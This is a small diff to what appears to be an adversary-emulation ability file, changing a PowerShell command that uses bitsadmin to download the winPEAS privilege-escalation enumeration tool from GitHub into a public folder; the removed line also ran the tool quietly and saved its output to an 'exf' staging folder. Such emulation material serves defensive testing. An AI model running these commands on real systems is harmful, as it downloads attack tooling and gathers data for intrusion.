@@ -10,8 +10,7 @@
     name: psh
     cleanup: []
     parsers: []
-    command: 'bitsadmin /transfer DownloadsWinPEAS /download /priority normal https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe $env:PUBLIC\\Toolz\\winPEASany_ofs.exe
-$env:PUBLIC\Toolz\winPEASany_ofs.exe quiet nocolor log=$env:PUBLIC\exf\winPEAS.txt'
+    command: 'bitsadmin /transfer DownloadsWinPEAS /download /priority normal https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe $env:PUBLIC\\Toolz\\winPEASany_ofs.exe'
     timeout: '60'
   repeatable: false
   additional_info: {}
